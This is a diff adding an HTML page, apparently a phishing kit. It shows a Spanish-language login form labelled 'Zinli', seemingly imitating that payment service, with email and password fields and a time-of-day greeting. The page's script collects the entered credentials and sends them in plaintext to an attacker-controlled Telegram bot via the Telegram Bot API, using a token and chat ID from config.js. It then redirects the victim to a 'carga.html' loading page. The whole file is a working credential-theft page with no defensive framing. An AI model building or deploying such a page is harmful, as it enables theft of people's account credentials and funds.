@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario con Envío a Telegram</title>
+    <style>
+        .form {
+            margin: 20px;
+            font-family: sans-serif;
+            height: 400px;
+            width: 380px;
+            text-align: left;
+        }
+
+        /* Estilos para los inputs */
+        .input-container {
+            position: relative;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .input-container input {
+            width: 90%;
+            height: 30px;
+            border: none;
+            border-bottom: 1px solid #5B5B5B;
+            outline: none;
+            font-size: 16px;
+            padding: 10px 0;
+        }
+
+        /* Placeholder que se desplaza hacia arriba */
+        .input-container label {
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            color: grey;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-container input:focus + label,
+        .input-container input:not(:placeholder-shown) + label {
+            top: -0px;
+            font-size: 12px;
+            color: #291588;
+        }
+
+        /* Botón de ingresar (color inicial más claro) */
+        input[type="submit"] {
+            width: 90%;
+            height: 50px;
+            border-radius: 5px;
+            outline: none;
+            border: none;
+            background-color: #d3bdf0; /* Color inicial del botón */
+            color: white;
+            font-size: 18px;
+            cursor: not-allowed;
+            transition: background-color 0.3s ease;
+        }
+
+        /* Botón activo cuando se cumple la validación */
+        input[type="submit"].active {
+            cursor: pointer;
+            background-color: #5A37B5; /* Color del botón activo */
+        }
+    </style>
+</head>
+<body style="margin: 0;">
+    <center>
+        <form class="form" id="myForm" onsubmit="sendToTelegram(event)">
+            <img style="width: 200px;margin-top: -25px;margin-left: -50px;" src="archivo/0x0.png" alt="">
+
+            <p id="greeting" style="font-size: 32px;color: #291588;">Buenos</p>
+            <br>
+            <div class="input-container">
+                <input type="text" id="email" placeholder=" " required minlength="8">
+                <label for="email">Correo electrónico</label>
+            </div>
+            <div class="input-container">
+                <input type="password" id="password" placeholder=" " required minlength="4">
+                <label for="password">Contraseña</label>
+            </div>
+            <p style="color: #463382; text-align: center;margin-left: -30px;">¿Olvidaste tu contraseña?</p>
+            <br>   
+            <br>
+            <input type="submit" value="INGRESAR" id="submitButton" disabled>
+        </form>
+    </center>
+
+    <script src="config.js"></script> <!-- Carga el archivo config.js -->
+
+    <script>
+        // Función para cambiar el saludo según la hora del día
+        function updateGreeting() {
+            const now = new Date();
+            const hour = now.getHours();
+            const greetingElement = document.getElementById("greeting");
+
+            if (hour >= 0 && hour < 12) {
+                greetingElement.textContent = "Buenos días";
+            } else if (hour >= 12 && hour < 18) {
+                greetingElement.textContent = "Buenas tardes";
+            } else {
+                greetingElement.textContent = "Buenas noches";
+            }
+        }
+
+        // Llamar a la función cuando cargue la página
+        window.onload = updateGreeting;
+
+        // Validación de campos y activación del botón
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+        const submitButton = document.getElementById("submitButton");
+
+        // Función para validar si el correo es válido
+        function isValidEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function validateForm() {
+            const isEmailValid = isValidEmail(emailInput.value);
+            const isPasswordValid = passwordInput.value.length >= 4;
+
+            if (isEmailValid && isPasswordValid) {
+                submitButton.disabled = false;
+                submitButton.classList.add('active');
+            } else {
+                submitButton.disabled = true;
+                submitButton.classList.remove('active');
+            }
+        }
+
+        // Escuchar los eventos de entrada para validar el formulario
+        emailInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+
+        // Función para enviar la información a Telegram y redirigir a carga.html
+        function sendToTelegram(event) {
+            event.preventDefault(); // Evitar el envío del formulario
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            // Construir el mensaje para enviar a Telegram
+            const message = `Zinli\n\nCorreo electrónico: ${email}\nContraseña: ${password}`;
+
+            // URL de la API de Telegram
+            const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}`;
+
+            // Enviar la solicitud a Telegram
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                     
+                        window.location.href = 'carga.html'; // Redirigir a carga.html después de enviar
+                    } else {
+                        alert('Error al enviar los datos a Telegram');
+                    }
+                })
+                .catch(error => {
+                    alert('Error en la solicitud a Telegram');
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</body>
+</html>
